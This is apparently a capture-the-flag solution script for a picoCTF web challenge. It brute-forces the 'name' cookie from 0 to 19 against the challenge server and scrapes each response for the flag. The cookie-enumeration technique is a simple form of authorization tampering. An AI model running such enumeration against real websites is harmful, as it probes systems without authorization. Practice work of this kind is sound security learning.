#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

#challenge url
url = 'http://mercury.picoctf.net:29649/check'

#perform brute forcing on the cookie 'name' value
print("[*] Starting brute forcing on cookie name value", end='\n\n')

for i in range(20):
	cookies = {
		'name' : str(i)
	}

	#perform GET request with the cookies set
	rsl = requests.get(url, cookies=cookies)
	
	#filter up the response result to find the div containing the data
	soup = BeautifulSoup(rsl.text,'html.parser')               
	contentInBox = soup.findAll("div", {'class':'jumbotron'})         
	
	#remove front and back text that's unnecessary
	removeLeadingText = """[<div class="jumbotron">\n<p class="lead"></p>\n<p style="text-align:center; font-size:30px;">"""
	removeTrailingText = """</div>]"""

	#reformat the reponse text
	formattedText = str(contentInBox).replace(removeLeadingText, '').replace(removeTrailingText, '')
	
	#find the text that containing 'picoCTF' keyword & that's the flag!
	if('picoCTF' in formattedText):
		print("Cookie name value: " + str(i))
		print("Flag: " + formattedText)